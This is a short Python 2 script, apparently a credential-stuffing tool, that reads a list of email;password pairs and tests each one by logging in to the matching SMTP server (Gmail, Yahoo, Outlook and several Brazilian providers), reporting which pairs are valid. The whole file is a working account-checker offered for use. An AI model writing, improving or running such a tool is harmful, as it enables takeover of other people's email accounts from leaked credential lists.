#!/usr/bin/python
# Check Login - Email Accounts
# By Sql3t0
#
# style from lines in file to read
# e.g:
# 	  filename.txt
#		email1@gmail.com;passwd1
#		email2@yahoo.com;passwd2
#		continue...
#
# Usage: python scriptname.py filename.txt


import sys
import smtplib
smtp_servers = [('gmail','smtp.gmail.com:587'),('yahoo','smtp.mail.yahoo.com:587'),('live','smtp.live.com:587'),('hotmail','smtp.live.com:587'),('outlook','smtp.live.com:587'),('uol','smtps.uol.com.br:587'),('bol','smtps.bol.com.br:587'),('globo','smtp.globo.com:465'),('ig','smtp.ig.com.br:465'),('terra','smtp.terra.com.br:587'),('ibest','smtp.ibest.com.br:465'),('itelefonica','smtp.itelefonica.com.br:25')]

def findSmtpServer(smtp_servers,mail):
	for s in smtp_servers:
		if s[0] in mail[mail.find('@'):]:
			return s[1]

def login(s,mail,passwd):
	s.starttls()
	#s.set_debuglevel(1) 
	try:
		s.login(mail,passwd)
	except smtplib.SMTPAuthenticationError as e:
		if e[0] == 534:
			sys.stdout.write('\r[+] Login: %s | Passwd: %s  [OK] ! 											\n'%(mail,passwd))
		elif e[0] == 535:
			sys.stdout.write('\r[-] Erro : Mail [ %s ] and Password [ %s ] not accepted !'%(mail,passwd))
		else:
			sys.stdout.write('\r[-] Undetermined Error ! 											')

	s.quit()

if __name__ == '__main__':
	if len(sys.argv) < 2:
		print '[!] Usage: %s listfile'%sys.argv[0]
		print """
# style from lines in file to read
# e.g:
# 	  filename.txt
#		email1@gmail.com;passwd1
#		email2@yahoo.com;passwd2
#		continue..."""
	else:
		for l in open(sys.argv[1]):
			dataLogin = l.replace('\n','').split(';')  
			mail   = dataLogin[0].strip('\n') 
			passwd = dataLogin[1].strip('\n')
			try:
				s = smtplib.SMTP(findSmtpServer(smtp_servers,mail))
				login(s,mail,passwd)
			except Exception as e:
				pass

		sys.stdout.write('\n[_] End Of Process !')
